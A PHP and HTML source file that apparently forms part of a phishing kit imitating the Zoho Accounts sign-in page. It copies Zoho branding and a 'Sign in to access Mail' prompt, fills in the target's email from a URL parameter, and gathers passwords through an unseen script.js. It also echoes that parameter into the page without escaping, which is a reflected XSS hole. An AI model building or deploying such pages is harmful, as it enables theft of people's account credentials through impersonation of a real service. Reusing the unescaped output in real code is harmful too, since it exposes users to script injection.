<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Zoho Accounts</title>
	<link rel="icon" href="zoho.jpg" />
	<link rel="stylesheet" href="style.css" />
</head>
<body>
	<section>
		<div class="container">
			<div class="left">
				<div style="width: 81%; margin:auto">
					<div class="logo-holder">
						<img src="logo.jpg" width="90px" height="30px">
					</div>
					<div class="text-holder" style="margin-bottom: 3em; float: left;">
						<span style="font-weight: 600; font-size: 24px; font-family: Arial, Helvetica, sans-serif; margin: 0px;" id="processing">Sign in</span>
						<p style="font-weight: 500; font-size: 18px; font-family: Arial, Helvetica, sans-serif; margin: 0px;" id="processing">to access Mail</p>
					</div>
					<div class="input-holder" id="emailDiv">
						<input type="email" name="" placeholder="Email address or mobile number" id="email" value="<?php echo $email; ?>" disabled>
						<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
						<button id="next">Next</button>
					</div>
					<div class="input-holder hide" id="passwordDiv">
						<input type="password" name="" placeholder="Password" id="password">
						<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
						<button id="login">Login</button>
					</div>
					<div class="forgot-pass" style="margin-bottom: 1.5em; margin-top: 2em; float: left;">
						<p style="font-weight: 500; font-size: 18px; font-family: Arial, Helvetica, sans-serif; margin: 0px; color:#62626b" id="processing">Forgot Password?</p>
					</div>
					<hr style="float: left; width: 100%; color:#eee;">
				</div>
			</div>
			<div class="right">
				<div class="logo-holder" style="margin-top: 3em;">
					<img src="zoho.png" width="160px" height="160px">
				</div>
				<div style="width: 75%; margin:auto;">
					<div style="margin-bottom: 1.5em; margin-top: 2em; float: left;">
						<h5 style="text-transform: uppercase; font-weight: 800; font-family: Arial, Helvetica, sans-serif; text-align: center;">Keep your account secure</h5>
						<p style="font-weight: 500; font-size: 14px; font-family: Arial, Helvetica, sans-serif; margin: 0px; color:#000; text-align: center;" id="processing">Keep your account secure Zoho OneAuth is our new in-house multi-factor authentication app. Shield your Zoho account with OneAuth now.</p>
					</div>
				</div>
			</div>
		</div>
	</section>
</body>
<script type="text/javascript" src="script.js"></script>
</html>